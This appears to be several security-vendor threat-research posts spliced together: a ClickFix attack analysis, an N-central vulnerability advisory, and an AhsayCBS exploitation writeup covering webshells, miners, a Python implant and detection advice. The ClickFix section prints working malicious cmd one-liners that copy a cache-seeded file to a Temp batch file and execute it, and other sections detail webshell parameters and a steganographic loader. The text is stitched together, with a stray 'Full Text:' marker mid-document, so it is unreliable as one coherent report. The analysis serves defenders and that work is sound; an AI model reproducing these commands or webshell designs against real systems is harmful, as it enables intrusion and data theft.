Along with spawning PowerShell for system fingerprinting, the malware established persistence by creating a user Run key named "DuskDesk" that executes node.exe with launch.js at every user logon.

While DuskDesk might be mistaken for a legitimate RMM in the user's environment, active connections revealed that node.exe established a TCP connection to the remote IP address 167.148.201[.]104 on port 3861, potentially enabling the attacker to establish command-and-control (C2) capability.

While similar tradecraft has been reported elsewhere, the incidents we investigated feature evolved tradecraft, including a more configurable DAT file and the addition of wrapped PowerShell commands.

Lateral movement to the domain controller

We've seen instances of lateral movement where threat actors used ClickFix to deliver a loader that pulled down a RAT, enabling them to jump to another system. These threat actors established a foothold, eventually using built-in tools to move laterally.

In one incident back in February, a ClickFix prompt led to the installation of the Matanbuchus 3.0 loader and then AstarionRAT. The operator used this RAT to perform reconnaissance, steal credentials, and eventually use PsExec to hop to a Windows Server and two domain controllers.

In a separate incident in May, a ClickFix attack against an unmonitored endpoint led to the installation of the Potemkin loader, RMMProject, and EtherRAT. SMBExec was used to deploy the malware through administrative shares, compromising 11 hosts before it was stopped.

Unlike these two examples, an incident in early September did not rely on a dedicated RAT as its primary foothold. Instead, the threat actor leveraged a lightweight execution and persistence chain using native Windows administration protocols to move from an initial endpoint to the domain controller and then create a reverse SSH tunnel.

The ClickFix command in this incident downloaded a ZIP file named cf_verify.zip into the user's Temp folder, created a folder named C:\ProgramData\f8f33b09aed97a47, and extracted the contents of the ZIP file to it, which created the following files:

1.bat

CertEnrollCtrl.exe

CertEnroll.dll (a malicious DLL used for DLL sideloading)

It then executed 1.bat, which created a user Run key and a scheduled task (both named CertEnrollCtrl_Y0db6oZq9) to run CertEnrollCtrl.exe. This executable uses the Windows Command Shell to launch a PowerShell script that performs Active Directory reconnaissance using multiple native Windows utilities:

nltest.exe to enumerate domain trust relationships and identify domain controllers

net.exe to query Domain Admins group membership and user account details

whoami.exe to identify the current user context

findstr.exe to filter command output for OS and network-configuration details

Several more files were added to the Temp folder, including a TXT file (%LocalAppData%\Temp\6341434163416441.txt) that contained a Base64-encoded PowerShell command that does the following:

Defines a working folder C:\ProgramData\ShService and drops an SSH private key into it

Sets up a reverse SSH tunnel and connects to attacker-controlled infrastructure located at 23.227.199[.]41

Creates a scheduled task named SysyService

Next, the attacker used WinRM to laterally move to the primary domain controller. Once access was obtained, the attacker created a new user account and attempted to add it to the local administrators group. They then created a second reverse SSH tunnel using the same PowerShell script described above.

Steganographic delivery chains

In another interesting incident, we observed a ClickFix steganographic delivery chain in which a user-executed command initiated a multi-stage attack that reconstructed executable payloads from data that was hidden inside PNG files.

This isn't the first time we've seen ClickFix leverage steganographic techniques, though there are some differences this time. The threat actors in the earlier incident hid shellcode instructions within images; this time it's full-blown executables.

The PowerShell copied via ClickFix triggered a fake Cloudflare verification inside a terminal window, similar to what has been described above. While displaying the fake verification, the PowerShell script dropped a compressed archive named verify_pkg.zip into the victim's C:\Users\user\AppData\Local\Temp\ folder. The command then unpacked this archive and placed a legitimate, signed Microsoft binary (LockScreenContentServer.exe) into C:\ProgramData\7168f7f870a45fbb\. Accompanying this trusted executable was a rogue DLL and a batch file named 1.bat.

The 1.bat file was then launched through cmd.exe, and served as a multi-stage PowerShell stager. To evade traditional network monitoring and file-based security controls, this stager relied on steganography. It retrieved benign-looking PNG image files that secretly contained embedded executable binaries within their pixel data. The PowerShell script extracted these hidden payloads, reconstructed the malicious binaries on disk, and executed them.

With the payload successfully reconstructed, the malware established persistent background execution by creating a scheduled task, as well as a Run key in the registry. These steps provided the threat actor with remote access to further their attack.

Cache me if you can

A recent investigation conducted by John Hammond uncovered an attack that varied its actions based on the browser in use in order to carry out a browser-cache-seeded delivery chain designed to deliver a whole trove of malware.

This is actually the compromised dental site mentioned previously, but to quickly recap, if a user clicked on the Manage Consent dialog box, a "Verify you are human" turnstile appeared. This led to a ClickFix attack that created a window with progress bars displaying fake network checks.

Figure 9: Compromised dental site previously discussed.

Early on, a check takes place to determine what browser the target is using. This check ultimately determines the ClickFix command that is served up to the user. For example:

Firefox:cmd /c for /r "%LOCALAPPDATA%\Mozilla\Firefox\Profiles" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

Chrome:cmd /c for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

Brave:cmd /c for /r "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat

The only difference between these commands is the folder location it points to for each browser's cache. Regardless of the browser, each command iterates through the files in the cache, looking for one that is 17,635 bytes in size.

It turns out that when the fake dental side was initially loaded, a 17,635-byte file was included and saved into the cache. When the ClickFix command finds this file, it copies it to the Temp folder as a batch file and executes it. This results in several stage two payloads, with one PowerShell file in turn calling several more malicious payloads.

Combating ClickFix

As we said at the beginning, attackers love ClickFix. Its prevalence as an attack technique leaves little doubt of this, and the fact that threat actors continue to come up with new and novel ways to utilize it only drives the point home.

It doesn't appear that these newer uses for ClickFix are part of one group's attempt to further the technique. Rather, unconnected threat actors or groups have observed how successful ClickFix has been in tricking targets and are experimenting with new ways to leverage it.

Fortunately, there are several things that can be done to combat ClickFix attacks.

Stop the paste

At its core, ClickFix is a social engineering attack mechanism, designed to take advantage of less technical or informed users. Combatting this requires user training to recognize ClickFix lures.

Train users to never paste commands into a Run dialog box, a terminal, PowerShell, or anything else at a web page's request. Emphasize that legitimate CAPTCHAs or "verification" workflows never require you to execute shell commands. Finally, encourage users to report suspicious pages to their Security or IT departments.

Control what can execute

In parallel, it's important to harden script and application execution on the endpoint. Utilize application control tools or allowlisting for untrusted executables. Block the execution from user-writable locations like the Temp folder and implement controls for unsigned binaries and suspicious archive extraction. Finally, limit the access to local administrator privileges, as well as opening the Run dialog box or a command prompt.

Detect the chain

Even with user training and endpoint controls in place, organizations should monitor for the behaviors that follow a successful ClickFix execution:

A browser or user-launched process spawning cmd.exe, PowerShell, or Windows Terminal

Encoded PowerShell commands

Execution-policy bypasses

Archives or executables appearing in user-writable locations

Detection should also extend beyond initial execution. New scheduled tasks, new Run keys, or unexpected SSH connections can all indicate that something is amiss. Because payloads and file names can change, defenders should focus on the sequence of activity rather than relying solely on hashes, domains, or other static indicators.

Full Text:
Acknowledgments: Special thanks to John Hammond, Ben Bernstein, and Andrew Brandt for their contributions to this investigation and writeup.

Huntress is tracking N-able's response to the public disclosure of critical vulnerabilities in its N-central platform, a remote monitoring and management (RMM) platform built for managed service providers and IT teams. On November 9, N-able took its hosted N-central environment offline while it worked to secure the environment and apply remediation.

That move came after an independent researcher published the details of 33 critical vulnerabilities to GitHub that can be chained to lead to four different exploits (dubbed "Able2Shell"). Three of those chained exploits lead to remote code execution and one leads to privilege escalation to root. The vulnerabilities impact servers running N-central Appliance 2026.4.0.31 (and likely earlier versions as well).

N-able said it has not seen active exploitation of the vulnerabilities as of November 9 at 15:15:00 UTC. The company is working on a hotfix that it said will be available soon; customers should keep their N-central servers offline until N-able confirms they can be brought back online safely.

Huntress has tracked and responded to other, separate flaws in N-able's N-central this year, including five critical CVEs:

August 2026: N-able released a hotfix for CVE-2026-18556, a critical vulnerability impacting all current versions of N-central across both hosted and on‑prem deployments, giving attackers unauthenticated, "god-mode" access to the RMM console. CVE-2026-18577 was disclosed soon after as an incomplete patch to the former CVE.

September 2026: N-able issued a hotfix to address a third vulnerability, CVE-2026-86218, an actively exploited pre-auth RCE zero day with a 10.0 CVSS score. The next day Huntress produced a proof of concept (PoC) exploit of a separate, net new vulnerability chain (CVE-2026-86206 and CVE-2026-86207) in N-central that allowed attackers to bypass access controls to create unauthorized administrative accounts.

What Should Potentially Impacted Organizations Do?

Potentially impacted organizations should do the following:

If you run N-central on premises, take the server offline now and keep it offline until N-able confirms it is safe to restore.

If you use N-able's hosted service, expect an outage. N-able has taken its cloud infrastructure offline; follow its status page for updates.

Review login and authentication activity from November 8 onward for unexpected or unauthorized access. If you find suspicious activity, involve your incident-response team and assess whether systems or client networks managed through N-central may also be affected. The document warns that exploitation could enable remote code execution or privilege escalation on the server.

Carefully examine your audit logs for secondary indicators of compromise. During previous N-central vulnerability exploitations (such as the CVE-2026-86218 zero-day), threat actors were observed "spraying" downstream environments with unauthorized scripts and tools. Specifically, you should monitor for anomalous remote access sessions, new scripts being deployed, or the unauthorized creation of new administrator accounts.

Apply N-able's hotfix and restore service only when N-able says it is safe. The document said a hotfix was in development, with no exact ETA, so check current vendor guidance rather than relying on this dated update.

N-able does not always iterate version numbers when it pushes down live hotfixes that don't require a reboot, so it remains to be seen whether the patched version will be numbered 2026.4.0.31 or something different.

Next Steps

Huntress is actively investigating this incident and we are communicating with our potentially vulnerable customers to share updates as they become available. Please check this blog for further updates as we learn more information.

You can also get further updates from N-able at: https://uptime.n-able.com/event/202561/

Background

In early October, Huntress began seeing threat actors exploit two flaws in AhsayCBS, the management console for Ahsay's backup software: CVE-2026-105133, an authentication bypass, and CVE-2026-105134, unauthenticated remote code execution as SYSTEM through /rps/api/json/UpdateReceivers.do. Our original blog post covered the first wave: webshells, an XMRig miner dressed up as Microsoft Edge, and a script that hid the miner from Task Manager. Ahsay has since released hotfixes (10.3.4.45 for v10, and 9.15.2.70 for v7 through v9), and we verified that 10.3.4.45 blocks the entry point we saw.

The impacted organization's servers in this post were exploited between October 8 and October 11, 2026, which was before Ahsay released its hotfixes. During our investigation into the attack, we analyzed webshells, loaders, and an implant that the threat actor used during the attack.

This activity matches the campaign in our first post. We tied it to AhsayCBS exploitation because the webshells sat inside AhsayCBS's own web directories, the AhsayCBS access logs show an exploit source address that is listed in that post, and one of the servers also held files matching that post's indicators.

When organizations apply hotfixes, it mitigates the issue moving forward, but if a compromise has already happened it does not remove files an actor has already planted. If your AhsayCBS servers were exposed before patching, it's worth searching your environment for the artifacts in this post.

What we found, at a glance

Our initial report described incidents that involved a quick smash and grab: a webshell or a few commands, then a miner. However, this incident reflects a much larger intrusion with more patience; the operator planted shells in several places, ran two different miners, staged tunneling tools, and installed a custom implant, all on servers whose job is to hold backups. The rest of this post takes apart the pieces one at a time.

Figure 1: An overview of what the operator left on the exploited servers

Webshells, in several flavors

Overall, we saw five webshell families during our investigation (seen in the table below), all with varying parameters and characteristics.

One of the most common webshells we found in this environment was small in size: it compared a hardcoded key in the p parameter against its own copy and returned a plain 404 if the key is wrong, so a scanner that does not know the key would see an empty page. With the right key, the c parameter would be passed to cmd.exe /c and the output would come back Base64-encoded.

The second webshell family included w and d parameters, which were designed to write Base64-decoded bytes to any path the service account can reach and make it easy to drop more tools. Every file carried its own key (always 12 hex characters followed by a capital P).

The third family looked completely different, and included files named status_ followed by six random letters. These shells used auth, cmd, del, and rm parameters: they were designed to run commands, recursively delete any path they are given, and delete themselves. To the latter point, defenders should keep in mind that the shell can delete itself after use, so not finding the file on disk does not prove it was never present.

A smaller variant of this family, named st_ followed by six random letters, drops the authentication and the delete function. It takes c with no authentication at all, plus a get=env parameter that prints the application home, the Catalina base, the operating system and the temp directory, and an rm=1 parameter that deletes the file.

Family

Parameters and behavior

Keyed command shell

p key (a wrong key returns 404), c command run through cmd.exe /c, output Base64-encoded. a and b return a sum, which works as a quick liveness check.

Keyed shell with file write

Same as above, plus w (path) and d (Base64 data) to write a file.

nsmind.jsp

AhsayCBS.jsp

The folder locations where we found these webshells gave us further insight into how the attack might vary across operating systems. The impacted servers here ran Windows: however, the exploit also attempted Linux-style installation paths, suggesting the exploit was not tailored to one operating system.

In addition to webapps\cbs and webapps\rps in the real install, we found copies in directories matching Linux-style paths, including /opt/AhsayCBS, /usr/local/AhsayCBS, and /home/ahsay/AhsayCBS. On one of the affected Windows servers, these appeared as folders under C:\opt, C:\usr, and C:\home, with a staging folder, C:\ahsay_tf, holding another copy. That suggests the exploit was not designed for a specific operating system or install path, and simply tried every likely location.

The copies outside the live install were not served by the web application, so they probably cannot be used as shells on Windows, but they are a reliable tell. Several shells also sat in random six-character folders, each containing its own app, conf, and webapps\cbs subfolders. These imitate the structure of an AhsayCBS install, but none of the components are part of the real application. Some of those folders held empty pb_ marker files in the conf folder, and folders named ahsay_poc_*, ahsay_tf, ahsay_th and ahsay_t0 showed up in Program Files.

Figure 2: Shell locations on a Windows host: the live install, and the Linux-style paths the exploit also tries

A webshell that hides inside an image

One of the webshell families, AhsayCBS.jsp (in webapps\rps), was disguised as an image-preview service: it was designed to extract encrypted code from uploaded PNGs and run it in memory while making its traffic resemble ordinary image requests.

The webshell's disguise as an internal image preview service even extended down to a comment block describing a watermark endpoint. The webshell used only JSP implicit objects and fully qualified class names, meaning it would compile on any servlet container and on Java Development Kit (JDK) 6 and later.

On the sample we saw, the webshell was designed to work as follows:

First, the operator POSTs a PNG.

Then the page reads the least-significant bit of each pixel's red, green and blue values, one pixel at a time.

It strings those bits together and packs them into bytes, with the first bit read becoming the most significant bit of each byte.

That rebuilds a four-byte big-endian length followed by that many bytes of payload, which it then decrypts with AES.

The key is hardcoded, and the cipher is Java's default AES transformation (translating to ECB mode with PKCS5 padding).

On the first request, the decrypted bytes are loaded as a Java class through a small custom ClassLoader and stored in the application context under the attribute name QuCh, and the page answers with its built-in cover image. On later requests, it creates an instance of that class, hands it the request, an output buffer and the decrypted data through calls to equals(), and calls toString() to run it. Whatever the class produces is encrypted again and written into a new PNG.

Passing arguments through equals() is a convention used by some open-source in-memory webshell frameworks, though we have not tied this one to a specific framework. The practical effect is that the functionality arrives per request and lives in memory. The access log showed what looked like image traffic, and there was no c or p parameter to search for. We analyzed the loader, not the class it receives, so we cannot confirm what the operator actually ran through it.

Figure 3: How AhsayCBS.jsp turns an uploaded image into running code

A webshell with a signed API

Not every shell was a one-liner. nsmind.jsp, also in webapps\rps, behaved like a small remote administration service.

In the sample we saw, every request must carry an X-Auth-Token header that matches a hardcoded API key, plus X-Timestamp, X-Nonce and an X-Signature header holding an HMAC-SHA256 of the request parameters. The timestamp has to be within five minutes of the server's clock, and each nonce is stored in the application context so a captured request cannot be replayed. A request that fails any check gets a short JSON error, so the page behaves like an ordinary API that rejects unauthenticated callers.

Behind the checks, the action parameter selects exec, cd, upload or download. exec runs the command through cmd.exe /c (after chcp 65001, so output comes back as UTF-8) and tracks the working directory between calls, so the operator gets a persistent shell. upload and download move files in chunks using an offset parameter, with a limit of 4 GB per file, which means a large file can be pulled off the server through many small requests.

On a server that holds backups, this download action is the part to worry about: it is a ready-made exfiltration channel that looks like normal API traffic. We did not see logs showing download in use, so we cannot say what, if anything, was taken.

The files also showed the operator iterating. In the same rps folder we found three timestamp-named folders, each holding a single copy of a shell. The oldest held the simple cmd, del and rm shell described above, and the two newer ones contained nsmind.jsp, which suggested the operator upgraded from a basic shell to this tool. We also found byte-identical copies of nsmind.jsp and AhsayCBS.jsp on two of the servers, which pointed to one operator or one script working across hosts.

A second miner, with its own persistence

The Edge-themed miner analyzed in our initial blog was not the only one: we also found another miner in our follow-up investigation.

The XMRig miner we observed (kvm-agent.exe) is configured like a standard XMRig build: donate level 0, MSR access enabled (the same capability the WinRing0 driver in the first post provides), and TLS connections on port 443 to SupportXMR pools. The wallet and password differed from the Kryptex pool and user listed in the first post, making us believe this was a separate miner and not a second copy of the first. We found the same file, with the same hash, on two servers, and the task on both was created the same night and edited within seconds of each other, which again points to one operator or one script working across hosts.

During our analysis, we found a scheduled task named kvm running as SYSTEM every minute. Its command used a tasklist to check whether kvm-agent.exe was running and, if it wasn't, it would start it from C:\Windows\SysWOW64\kvm-agent. This means that if the miner was killed, it would be back up and running within a minute. The task's start time was set well before the intrusion (making it look older than it was in task listings).

Figure 4: The kvm scheduled task (start time elided)

A Python implant that only runs where it was staged

The most interesting file we pulled was main.py, which sits in an embedded Python distribution under the SYSTEM profile and is started from a Run key through explorer.exe. The script is only a wrapper: Base64, then lzma, then a marshaled Python code object that it passes to exec. Decoding it without running it shows that the code was compiled from a file called heap_shellcode_runner_bound_weaponized.py.

The code computes the SHA-256 of the host's MachineGuid and looks for a file with that name next to main.py. Based on the bytecode, if the marker file is missing, the script exits. That would keep the implant from running in a sandbox or on an analyst's machine, because the marker only exists on the host it was provisioned for. We did not find a marker file in the folder we collected, so either it was not part of what we pulled or it was removed. If the marker is present, the script copies a 673 KB blob into an executable heap (HeapCreate, HeapAlloc, RtlMoveMemory) and starts it on a new thread with CreateThread.

Figure 5: The implant's execution flow, reconstructed from static analysis

Figure 6: The decoded logic, reconstructed from the code object

The blob starts with a short bootstrap that calls a reflective loader at the end of the blob, which in turn maps an x64 DLL carried inside it. The DLL is C++ with a JSON library and imports very little: bcrypt, KERNEL32, OLEAUT32 and SHLWAPI, with the networking functions resolved at run time. It has no export table, no PDB path and no version resource, so the usual attribution breadcrumbs have been stripped.

Its strings include the C2 URL hxxps://creepexplosiondarknight[.]com/d, a JSON content type, a mutex, and string fragments (dns.quad with 9.net, and dns.goog) consistent with DNS-over-HTTPS lookups through Quad9 and Google. It also reads MachineGuid and Windows version information, which fits host identification. We have not identified the malware family and have not watched the implant run, so what it does after it checks in is still an open question.

Figure 7: Selected strings from the embedded DLL (C2 defanged)

The rest of the toolkit

Around those pieces, the same environment held the tunneling tools gost and chisel, staged in .st<id> folders as wust<id>a.exe and wust<id>b.exe, the remote access tools AnyDesk, Atera and Splashtop, a local account named wdguest, and a Mimikatz package on disk. We also saw Microsoft Defender exclusions that covered C:\ProgramData, C:\Windows, temp folders, the dropper processes, and the AhsayCBS service process (cbssvcX64.exe). These exclusions would have reduced Defender's ability to scan files in those locations and files accessed by the excluded processes, creating broad blind spots for the operator's tooling.

Backup servers as a target

Everything above ran on servers whose purpose is to hold or manage backups. On a related Veeam server in the same environment, we also saw a command consistent with NetExec's Veeam credential-theft module: a PowerShell script, apparently launched remotely through WMI, that queried the VeeamBackup PostgreSQL database for stored credentials and decrypted them with DPAPI. Backup software holds credentials for hypervisors, repositories and domain accounts. We cannot say how many of those credentials were retrieved, but the pairing of an Ahsay foothold with a Veeam credential query suggested the operator was interested in backup infrastructure on purpose, not by accident.

What to check for

Patching closes the entry point. It does not clean up what already happened, so on any server that was exposed before the hotfix, look for:

Unexpected .jsp files under webapps\cbs and webapps\rps, especially random names and the status_ and st_ patterns, and requests to UpdateReceivers.do in the AhsayCBS access logs

Folders named ahsay_*, home, opt, srv or usr at the root of the drive or in Program Files, and timestamp-named folders (year-month-day-hour-minute-second) next to the shells, which in some cases held a single copy of one

Scheduled tasks and services you did not create, including a SYSTEM task with a one-minute repeat that tests for a process with tasklist

Defender exclusions you did not add, especially for C:\ProgramData, C:\Windows and the AhsayCBS service process

An embedded Python install under the SYSTEM profile and a Run key that launches it

A few behaviors make useful detections even when the files are gone:

python.exe or pythonw.exe running from a path under the SYSTEM profile

Outbound requests to public DNS-over-HTTPS resolvers from a process that is not a browser

New .jsp files created under the AhsayCBS web directories

The parent-child pattern our earlier Sigma rule already looks for, where cbssvcX64.exe spawns a command shell.

If you find any of the above, we recommend a full re-image from a trusted backup and rotating credentials stored on or reachable from the server, including those saved in AhsayCBS and in any backup software on the same network.
